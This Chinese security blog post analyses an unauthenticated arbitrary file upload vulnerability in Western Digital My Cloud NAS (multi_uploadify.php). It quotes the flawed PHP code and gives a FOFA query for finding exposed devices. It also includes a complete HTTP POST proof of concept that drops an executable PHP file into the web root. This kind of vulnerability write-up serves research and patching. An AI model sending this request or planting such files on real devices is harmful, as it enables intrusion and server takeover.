---
title: "Western Digital My Cloud NAS multi_uploadify.php 文件上传漏洞"
source: https://mrxn.net/jswz/Western-Digital-My-Cloud-NAS-multi_uploadify-rce.html
asset_dir: assets/western-digital-my-cloud-nas-multi_uploadify.php-文件上传漏洞
---

# Western Digital My Cloud NAS multi\_uploadify.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/5 08:23
- 855浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

西部数据

Western Digital

My-Cloud-NAS

---

# 漏洞简介

Western Digital My Cloud NAS是美国西部数据（Western Digital）公司的一款应用广泛的网络连接云存储设备，可用于托管文件，并自动备份和同步该文件与各种云和基于Web的服务。Western Digital My Cloud NAS `multi_uploadify.php` 接口存在任意[文件上传](https://mrxn.net/tag/文件上传)漏洞，允许未经身份验证的攻击者上传恶意代码，植入后门，获取服务器权限，并控制整个 Web 服务器。

硬盘驱动器

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> `icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"`

# 漏洞分析

直接看 `/jquery/uploader/multi_uploadify.php` 关键业务逻辑的实现

```
$ip = gethostbyaddr($_SERVER['HTTP_HOST']);
$name = $_REQUEST['name'];
$pwd = $_REQUEST['pwd'];
$redirect_uri =  $_REQUEST['redirect_uri'];

//echo $name ."<br>".$pwd."<br>".$ip;

$result = @stripslashes( @join( @file( "http://".$ip."/mydlink/mydlink.cgi?cmd=1&name=".$name."=&pwd=".$pwd ),"" ));

$result_1 = strstr($result,"<auth_status>0</auth_status>");
$result_1 = substr ($result_1, 0,28);

if (strncmp ($result_1,"<auth_status>0</auth_status>",28) == 0 )
//if (strstr($result,"<auth_status>0</auth_status>")== 0 )
{
        header("HTTP/1.1 302 Found");
  header("Location: ".$redirect_uri."?status=0");
  exit();
}

if (!empty($_FILES)) {

                $targetPath =  $_REQUEST['folder'] . '/';
                $count = (count($_FILES["Filedata"])-2);

                for ( $I=0; $I < $count; $I++ )
                {
                        $tempFile = $_FILES['Filedata']['tmp_name'][$I];

                        if ($tempFile == "")
                        {
                                        continue;
                        }
                        $new_file_name =  str_replace('\\','',$_FILES['Filedata']['name'][$I]);  //amy++
                        $targetFile =  str_replace('//','/',$targetPath) . $new_file_name;

                        $status = move_uploaded_file($tempFile,$targetFile);
```

深入探索

代码安全审计

安全研究工具

SQL

特别需要注意的是

漏洞扫描服务

[![Western Digital My Cloud NAS multi_uploadify.php 文件上传漏洞](images/img-001-c79750673296.webp)](https://image.mrxn.net/4eb921496f784e55912478ff0830e390.webp)

该上传逻辑错误地通过计算`$_FILES['Filedata']`的键数量（而非实际文件数）确定循环次数，且因未使用`Filedata[]`数组形式字段名导致多文件解析失效，结合未校验的`folder`参数，形成**目录遍历+任意文件上传漏洞**，允许攻击者可控文件路径及内容。

数据备份与恢复

# 漏洞复现

```
POST /web/jquery/uploader/multi_uploadify.php?folder=/var/www/ HTTP/1.1
Host: western.digital.nas.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="Filedata[]"; filename="1.php"
Content-Type: application/octet-stream

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundary--
```

访问上传文件 `1.php` ，成功[执行上传代码](https://mrxn.net/tag/rce)。

[![Western Digital My Cloud NAS multi_uploadify.php 文件上传漏洞](images/img-002-203efa2a381b.webp)](https://image.mrxn.net/874bfb11e6514737acaa170ff4c45434.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
